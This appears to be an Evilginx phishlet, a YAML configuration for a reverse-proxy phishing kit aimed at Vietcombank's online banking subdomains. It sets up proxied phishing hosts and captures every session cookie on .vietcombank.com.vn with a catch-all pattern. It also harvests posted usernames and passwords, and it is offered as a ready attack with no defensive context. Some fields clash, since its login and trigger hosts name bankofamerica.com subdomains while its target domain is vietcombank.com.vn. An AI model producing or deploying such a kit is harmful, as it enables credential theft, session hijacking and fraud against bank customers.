author: '@test'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'vcbdigibank', orig_sub: 'vcbdigibank', domain: 'vietcombank.com.vn', session: true, is_landing: true}
  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'vietcombank.com.vn', session: false, is_landing: false}
  - {phish_sub: 'digiapp', orig_sub: 'digiapp', domain: 'vietcombank.com.vn', session: false, is_landing: false}


sub_filters:
  - {triggers_on: 'vcbdigibank.bankofamerica.com', orig_sub: 'vcbdigibank', domain: 'vietcombank.com.vn', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'vcbdigibank.bankofamerica.com', orig_sub: 'vcbdigibank', domain: 'vietcombank.com.vn', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'portal.bankofamerica.com', orig_sub: 'portal', domain: 'vietcombank.com.vn', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'portal.bankofamerica.com', orig_sub: 'portal', domain: 'vietcombank.com.vn', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'digiapp.bankofamerica.com', orig_sub: 'digiapp', domain: 'vietcombank.com.vn', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'digiapp.bankofamerica.com', orig_sub: 'digiapp', domain: 'vietcombank.com.vn', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}

auth_tokens:
  - domain: '.vietcombank.com.vn'
    keys: ['.*,regexp']

auth_urls:
  - ''
  - '' 

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'vcbdigibank.bankofamerica.com'
  path: '/login'